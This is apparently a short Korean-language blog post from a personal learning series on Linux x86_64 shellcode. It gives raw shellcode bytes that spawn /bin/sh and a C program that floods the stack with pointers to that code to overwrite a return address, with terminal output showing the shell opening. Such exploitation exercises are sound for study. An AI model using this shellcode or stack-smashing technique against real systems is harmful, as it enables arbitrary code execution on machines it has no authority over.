---
layout: post
title: "Linux x86_64 shellcode 3"
date: 2014-11-10 01:41:33 +0900
comments: true
categories: 
---

이번에는 계산해서 `return address` 를 덮어쓰는 것이 아니라, 80 바이트정도로 스택 프레임을 밀어본다. 그래도 동작한다.

    char *_shellcode = ""
        "\x48\x31\xd2"
        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
        "\x48\xc1\xeb\x08"
        "\x53"
        "\x48\x89\xe7"
        "\x48\x31\xc0"
        "\x50"
        "\x57"
        "\x48\x89\xe6"
        "\xb0\x3b"
        "\x0f\x05" ;

    char *_shells[10];

    void explode() {
        long *ret;
        memcpy(&ret,_shells,8*10);
    }

    main()
    {
        int i;
        for (i=0;i<10;i++) _shells[i]=_shellcode;
        explode();
    }

    z@ubuntu:~/shells% gcc s3.c -o s3
    z@ubuntu:~/shells% ./s3
    $ 

